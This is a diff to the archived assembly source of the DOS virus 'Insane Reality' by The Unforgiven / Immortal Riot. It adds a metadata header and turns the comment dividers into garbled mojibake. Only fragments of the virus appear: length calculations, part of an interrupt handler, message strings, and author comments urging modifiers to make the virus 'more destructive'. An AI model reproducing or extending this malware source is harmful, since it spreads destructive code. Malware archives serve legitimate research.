@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      I
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; VirusName : Insane Reality              
 ; Country   : Sweden
 ; Author    : The Unforiven / Immortal Riot
@@ -42,11 +53,11 @@
                 .code
                 org     0
 
-; ÄÄ---Ä-ÄÄÄÄÄ--Ä-ÄÄÄÄÄ--ÄÄÄÄ-Ä-ÄÄÄÄÄÄÄÄÄÄ-ÄÄÄ-ÄÄ-
+; ï¿½ï¿½---ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½-ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½-ï¿½ï¿½-
 ;   Disassembly by Dark Angel of Phalcon/Skism
 ;   Assemble with Tasm /m Insane.asm, then link
 ;   and use exe2bin for make this into a .com..
-; Ä-ÄÄÄ-ÄÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄ--ÄÄ-
+; ï¿½-ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½-
 
 virlength       =       (readbuffer - leech)
 reslength       =       (((encrypted_file - leech + 15) / 16) + 2)
@@ -570,12 +581,12 @@ setint13and24:
                 pop     ax
                 retn
 
-;ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
+;ï¿½ï¿½-ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½----ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½-
 ; Okey..don't change the text to much here, cuz	the virus will refuse
 ; to work correctly if you writes to many chars..If you wanna modify
 ; this virus, make it a bit more destructive than it already is. I
 ; love destructive codes..It reminds me of my Brain..(??) <grin>..
-;ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
+;ï¿½ï¿½-ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½--ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½----ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½-
 
 message         db      'Insane Reality..  ', 0	   ; Mutation name..
                 db      'The Unforgiven / IR..  '  ; That's me..
